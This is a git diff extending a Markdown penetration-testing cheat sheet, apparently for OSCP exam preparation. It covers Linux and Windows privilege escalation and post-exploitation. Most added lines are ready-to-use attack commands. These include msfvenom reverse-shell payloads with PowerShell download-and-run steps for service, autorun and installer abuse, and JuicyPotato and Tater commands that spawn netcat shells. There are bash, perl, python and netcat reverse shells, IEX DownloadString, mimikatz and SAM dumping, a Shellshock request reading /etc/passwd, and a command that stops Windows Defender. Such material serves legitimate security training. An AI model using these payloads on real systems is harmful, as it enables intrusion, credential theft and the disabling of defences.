@@ -652,14 +652,57 @@
 	searchsploit -m NUMBER_EXPLOIT
 	```
 
-## System Enumeration
+### Log poisoning
+	```
+	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
+	```
 
-### PEASS-ng
+## System Enumeration and attack vectors
+
+### Linux
+1. Enumeration scripts
 	```
-	cd PEASS-ng/linpeas (or winpeas)
-	sudo python -m http.server
-	wget http://KALI_IP:8000/linpeas.sh (or winpeas.exe or winpeas.bat
+	bash LinEnum.sh
+	bash lse.sh -l 1
+	bash linpeas.sh
+	python linuxprivchecker.py
+	./unix-privesc-check standard
 	```
+2. Vulnerability Scan
+	```
+	perl les2.pl
+	bash les.sh
+	```
+3. SUID Check ([More](https://gtfobins.github.io/)
+	```
+	python suid3num.py
+	```
+4. Methology
+	```
+	https://guif.re/linuxeop
+	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
+	
+	sudo -l
+	Kernel Exploits
+	OS Exploits
+	Password reuse (mysql, .bash_history, 000- default.conf...)
+	Known binaries with suid flag and interactive (nmap)
+	Custom binaries with suid flag either using other binaries or with command execution
+	Writable files owned by root that get executed (cronjobs)
+	MySQL as root
+	Vulnerable services (chkrootkit, logrotate)
+	Writable /etc/passwd
+	Readable .bash_history
+	SSH private key
+	Listening ports on localhost
+	/etc/fstab
+	/etc/exports
+	/var/mail
+	Process as other user (root) executing something you have permissions to modify
+	SSH public key + Predictable PRNG
+	apt update hooking (PreInvoke)
+	```
+	
 ### Windows
 Do not forget if availabe: ``` powershell -ep bypass ```
 
@@ -672,46 +715,325 @@ Do not forget if availabe: ``` powershell -ep bypass ```
 	```
 	.\shell.exe
 	```
+3. Enumeration Scripts
+	```
+	\# General
+	winPEAS.exe
+	windows-privesc-check2.exe
+	Seatbelt.exe -group=all
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+	Powerless.bat
+	winPEAS.bat
+	
+	\# CVE Search
+	systeminfo > systeminfo.txt
+	python windows-exploit-suggester.py --update
+	python windows-exploit-suggester.py --database <DATE>-mssb.xlsx --systeminfo systeminfo.txt
+
+	systeminfo > systeminfo.txt
+	wmic qfe > qfe.txt
+	python wes.py -u
+	python wes.py systeminfo.txt qfe.txt
+
+	powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"
+	
+	\# Post Exploit (more to follow)
+	lazagne.exe all
+	SharpWeb.exe
+	mimikatz.exe
+	```
+4. Juicy Potato
+	```
+	\# If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
+
+	JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
+	JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
+
+	\# CLSID
+	https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+	```
+5. Methology to Follow
+	```
+	https://guif.re/windowseop
+	https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+	https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
+	http://www.fuzzysecurity.com/tutorials/16.html
+	https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+	```
+6. Autorun
+	```
+	\# Detection
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+	[*] Checking for modifiable registry autoruns and configs...
+
+	Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
+	Path           : "C:\Program Files\Autorun Program\program.exe"
+	ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}
+	
+	\# or
+	
+	winPEAS.exe
+
+	[+] Autorun Applications(T1010)
+	    Folder: C:\Program Files\Autorun Program
+	    File: C:\Program Files\Autorun Program\program.exe
+	    FilePerms: Everyone [AllAccess]
+	
+	\# Exploits
+	\# Attacker
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	\# Victim
+	cd C:\Program Files\Autorun Program\
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+	To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+	```
+7. AlwaysInstallElevated
+	```
+	\# Detection
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+	[*] Checking for AlwaysInstallElevated registry key...
+
+	AbuseFunction : Write-UserAddMSI
+	
+	\# or
+	
+	reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+	reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+	If both values are equal to 1 then it's vulnerable.
+	
+	\# or 
+	winPEAS.exe
+
+	[+] Checking AlwaysInstallElevated(T1012)
+
+	  AlwaysInstallElevated set to 1 in HKLM!
+	  AlwaysInstallElevated set to 1 in HKCU!
+	
+	\# Exploit 
+	\# Attacker
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi > program.msi
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	\# Victim
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.msi', 'C:\Temp\program.msi')
+	msiexec /quiet /qn /i C:\Temp\program.msi
+	```
+8. Executable Files
+	```
+	\# Executable
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+	[*] Checking service executable and argument permissions...
+
+	ServiceName                     : filepermsvc
+	Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
+	ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
+	ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
+	ModifiableFileIdentityReference : Everyone
+	StartName                       : LocalSystem
+	AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
+	CanRestart                      : True
+	
+	\# or
+	
+	winPEAS.exe
+
+	[+] Interesting Services -non Microsoft-(T1007)
+
+	filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+		File Permissions: Everyone [AllAccess]
+		
+	\# Exploitation
+	# Attacker
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	# Victim
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', 'C:\Temp\program.exe')
+	copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
+	sc start filepermsvc
+	```
+9. Startup Applications
+	```
+	\# Detection
+	icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+
+	C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+	C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
+								     TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
+								     NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+								     BUILTIN\Administrators:(I)(OI)(CI)(F)
+								     BUILTIN\Users:(I)(OI)(CI)(RX)
+								     Everyone:(I)(OI)(CI)(RX)
+
+	If the user you're connecte with has full access ‘(F)’ to the directory (here Users) then it's vulnerable.
+	
+	\# Exploitation
+	# Attacker
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > program.exe
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	# Victim
+	cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/program.exe', '.\program.exe')
+
+	To execute it with elevated privileges we need to wait for someone in the Admin group to login.
+	```
+10. Weak service permissions
+	```
+	\# Detection
+	# Find all services authenticated users have modify access onto
+	accesschk.exe /accepteula -uwcqv "Authenticated Users" *
+
+	if SERVICE_ALL_ACCESS then vulnerable
+
+	# Find all weak folder permissions per drive.
+	accesschk.exe /accepteula -uwdqs Users c:\
+	accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\
+
+	# Find all weak file permissions per drive.
+	accesschk.exe /accepteula -uwqs Users c:\*.*
+	accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*
+
+	\# or
+
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+	[*] Checking service permissions...
+
+	ServiceName   : daclsvc
+	Path          : "C:\Program Files\DACL Service\daclservice.exe"
+	StartName     : LocalSystem
+	AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
+	CanRestart    : True
+
+	\# or
+
+	winPEAS.exe
+
+	[+] Interesting Services -non Microsoft-(T1007)
+
+	daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+		YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+
+	[+] Modifiable Services(T1007)
+		LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
+		daclsvc: WriteData/CreateFiles
+	
+	\# Exploitation
+	# Attacker
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	# Victim
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+	sc config <SERVICENAME> binpath= "<PATH>\nc.exe <IP> <PORT> -e cmd.exe"
+	sc start <SERVICENAME>
+	or 
+	net start <SERVICENAME>
+	```
+
+11. Unquoted service paths
+	```
+	\# Detection
+	powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
+
+	[*] Checking for unquoted service paths...
+
+	ServiceName    : unquotedsvc
+	Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+	ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
+	StartName      : LocalSystem
+	AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+	CanRestart     : True
+
+	ServiceName    : unquotedsvc
+	Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+	ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
+	StartName      : LocalSystem
+	AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
+	CanRestart     : True
+
+	\# or
+
+	winPEAS.exe
+
+	[+] Interesting Services -non Microsoft-(T1007)
+
+	unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+	
+	\# Exploitation
+	# Attacker
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > Common.exe
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	# Victim
+	cd "C:\Program Files\Unquoted Path Service\"
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Common.exe', '.\Common.exe')
+	sc start unquotedsvc
+	```
+
+12. Hot potato
+	```
+	\# Exploitation
+	# Attacker
+	sudo python -m SimpleHTTPServer 80
+	sudo nc -lvp <PORT>
+
+	# Victim
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/nc.exe', '.\nc.exe')
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<IP>/Tater.ps1.exe', '.\Tater.ps1.exe')
+	powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <IP> <PORT> -e cmd.exe' }"
+	```
+13. CVEs
+	```
+	# Already compiled exploit
+	https://github.com/SecWiki/windows-kernel-exploits
+	https://github.com/abatchy17/WindowsExploits
+	```
 
 ## High Privilege Exploitation
 
-### Sudo
+### Linux
 
+1. Sudo
 	```
 	sudo -l
 	```
-
-### SUID
-
+2. SUID
 	```
 	find / -user root -perm -4000 -print 2>/dev/null
 	find / -perm -u=s -type f 2>/dev/null
 	find / -user root -perm -4000 -exec ls -ldb {} \;ls -
-	```
-	
-### Escaping restricted shell
-
+	```	
+3. Escaping restricted shell
 	```
 	ssh USER@IP -t "bash --noprofile"
 	ssh username@IP -t “/bin/sh” or “/bin/bash”
 	ssh username@IP -t “() { :; }; /bin/bash” (Shellshock)
 	```
-	
-### ID_RSA SSH login
+4. ID_RSA SSH login
 	```
 	chmod 666 key
 	ssh -i key USER@IP
 	```
-
-### Dirty cow (fix to work)
+5. Dirty cow (fix to work)
 	```
 	PATH=PATH$:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/gcc/x86_64-linux-gnu/4.8/;export PATH
 	```
-	
-### Log poisoning
-	```
-	http://IP:PORT/index.php?book=../../../../var/log/apache2/access.log&cmd=whoami
-	```
+6. 
+
 	
 ## Post Exploitation
 
@@ -796,6 +1118,15 @@ Internet traffic on port 80 redirection from Kali to Victim
 	\# Confirm
 	ps aux | grep htc
 	ss- antp | grep "8080"
+	```
+
+8. SSHuttle
+	```
+	sshuttle <USER>@<IP> <IP_OF_THE_INTERFACE>/CIDR
+	```
+9. Interesting links
+	```
+	https://artkond.com/2017/03/23/pivoting-guide/
 	```
 
 ### Active Directory
@@ -1108,4 +1439,285 @@ Internet traffic on port 80 redirection from Kali to Victim
 	```
 	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4
 	hashcat -m MODE hash.txt /usr/share/wordlists/rockyou.txt -w 4 --show
+	```
+3. fcrackzip
+	```
+	fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' file.zip
+	```
+
+**Also can use [CrackStation](https://crackstation.net/)**
+
+3. Exploit Compilation
+	```
+	gcc -o exploit exploit.c
+	gcc -m32 -o exploit exploit.c \# 32 bit
+	i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe \# Windows
+	gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c \# Cross Compilation
+	```
+4. Dictionary Generation
+	```
+	cewl -m <WORDS_SIZE> --with-numbers -w dictiFromWebsite <URL> -d <DEPTH>
+	crunch 5 5 -f /usr/share/crunch/charset.lst mixalpha-numeric-all -t Test@ -o passwords.txt
+	```
+5. File transfer
+	```
+	\# Linux
+	\# PYTHON
+	python -m SimpleHTTPServer <PORT>
+	python2.7 -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
+	\# FTP
+	sudo python3 -m pyftpdlib  -p 21 -w
+	\# SMB
+	sudo smbserver.py -smb2support liodeus .
+	\# WGET
+	wget <URL> -o <OUT_FILE>
+	\# CURL
+	curl <URL> -o <OUT_FILE>
+	\# NETCAT
+	nc -lvp 1234 > <OUT_FILE> 
+	nc <IP> 1234 < <IN_FILE> 
+	\# SCP
+	scp <SOURCE_FILE> <USER>@<IP>:<DESTINATION_FILE>
+	
+	\# Windows
+	\# FTP 
+	echo open <IP> 21 > ftp.txt echo anonymous>> ftp.txt echo password>> ftp.txt echo binary>> ftp.txt echo GET <FILE> >> ftp.txt echo bye>> ftp.txt
+	ftp -v -n -s:ftp.txt
+	\# SMB
+	copy \\<IP>\<PATH>\<FILE> # Linux -> Windows
+	copy <FILE> \\<IP>\<PATH>\ # Windows -> Linux
+	\# Powershell
+	powershell.exe (New-Object System.Net.WebClient).DownloadFile('<URL>', '<DESTINATION_FILE>')
+	powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('<URL>')
+	powershell "wget <URL>"
+	\# Python
+	python.exe -c "from urllib import urlretrieve; urlretrieve('<URL>', '<DESTINATION_FILE>')"
+	\# CertUtil
+	certutil.exe -urlcache -split -f "<URL>"
+	\# NETCAT
+	nc -lvp 1234 > <OUT_FILE> 
+	nc <IP> 1234 < <IN_FILE>
+	\# CURL
+	curl <URL> -o <OUT_FILE>
+	```
+6. GIT
+	```
+	\# Donwload .git
+	mkdir <DESTINATION_FOLDER>
+	./gitdumper.sh <URL>/.git/ <DESTINATION_FOLDER>
+	
+	\# extract .git
+	mkdir <EXTRACT_FOLDER>
+	./extractor.sh <DESTINATION_FOLDER> <EXTRACT_FOLDER>
+	```
+7. Hashes
+	```
+	\# Windows
+	reg save HKLM\SAM c:\SAM
+	reg save HKLM\System c:\System
+
+	samdump2 System SAM > hashes
+
+	
+	\# Linux
+	unshadow passwd shadow > hashes
+	```
+8. Mimikatz
+	```
+	privilege::debug
+
+	sekurlsa::logonpasswords
+	sekurlsa::tickets /export
+
+	kerberos::list /export
+
+	vault::cred
+	vault::list
+
+	lsadump::sam
+	lsadump::secrets
+	lsadump::cache
+	```
+9. Windows path without spaces
+	```
+	# path.cmd
+	@echo off
+	echo %~s1
+
+	path.cmd "C:\Program Files (x86)\Common Files\test.txt"
+	C:\PROGRA~2\COMMON~1\test.txt -> Valid path without spaces
+	```
+10. MsfVenom Payloads
+	```
+	\# Linux
+	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+	\# Windows
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+	\# PHP
+	msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+	\# Then we need to add the <?php at the first line of the file so that it will execute as a PHP webpage
+	cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+	\# ASP
+	msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+	\# JSP
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
+	\# WAR
+	msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
+	\# Python
+	msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+	\# Bash
+	msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+	\# Perl
+	msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
+	```
+11. Listeners
+	```
+	use exploit/multi/handler
+	set PAYLOAD <PAYLOAD>
+	set LHOST <LHOST>
+	set LPORT <LPORT>
+	set ExitOnSession false
+	exploit -j -z
+	
+	nc -nvlp PORT
+	```
+
+12. Reverse Shells [More Here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+	```
+	\# Nice tool
+	# Download
+	git clone https://github.com/ShutdownRepo/shellerator
+
+	# Install requirements
+	pip3 install --user -r requirements.txt
+
+	# Executable from anywhere
+	sudo cp shellrator.py /bin/shellrator
+	
+	\# Bash
+	bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+	
+	\# Perl
+	perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+	
+	\# Python
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+	
+	\# Netcat
+	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
+	
+	\# Interactive Shells
+	--> Python
+	python -c 'import pty; pty.spawn("/bin/bash")'
+	python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+	--> Bash
+	echo os.system('/bin/bash')
+
+	--> Sh
+	/bin/bash -i
+
+	--> Perl
+	perl -e 'exec "/bin/bash"'
+
+	--> Ruby
+	exec "/bin/bash"
+
+	--> Lua
+	os.execute('/bin/bash')
+	
+	\# Adjusting for interactive shells
+	stty size # Find your terminal size -> 50 235
+	Ctrl-Z
+	stty raw -echo  // Disable shell echo
+	fg
+	export SHELL=bash
+	export TERM=xterm OR export TERM=xterm-256color
+	stty rows 50 columns 235
+	```
+13. Shellshocks
+	```
+	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" <URL>/cgi-bin/<SCRIPT>
+	```
+
+## Useful Linux Commands
+### Find a file
+	```
+	locate <FILE>
+	find / -name "<FILE>"
+	```
+### Active connection
+	```
+	netstat -lntp
+	```
+### List all SUID files
+	```
+	find / -perm -4000 2>/dev/null
+	```
+### Determine the current version of Linux
+	```
+	cat /etc/issue
+	```
+### Determine more information about the environment
+	```
+	uname -a
+	```
+### List processes running
+	```
+	ps -faux
+	```
+### List the allowed (and forbidden) commands for the invoking use
+	```
+	sudo -l
+	```
+	
+## Useful Windows Commands
+	```
+	net config Workstation
+	systeminfo
+	net users
+
+	ipconfig /all
+	netstat -ano
+
+	schtasks /query /fo LIST /v
+	tasklist /SVC
+	net start
+	DRIVERQUERY
+
+	reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+	reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+
+	dir /s pass == cred == vnc == .config
+	findstr /si password *.xml *.ini *.txt
+	reg query HKLM /f password /t REG_SZ /s
+	reg query HKCU /f password /t REG_SZ /s
+	```
+	
+### Disable windows defender
+	```
+	sc stop WinDefend
+	```
+### Bypass restrictions
+	```
+	powershell -nop -ep bypass
+	```
+### List hidden files
+	```
+	dir /a
+	```
+### Find a file
+	```
+	dir /b/s "<FILE>"
+	```
+	
+## Get Proofs for OSCP exam
+### Linux
+	```
+	echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "
+	```
+
+### Windows
+	```
+	echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"
 	```
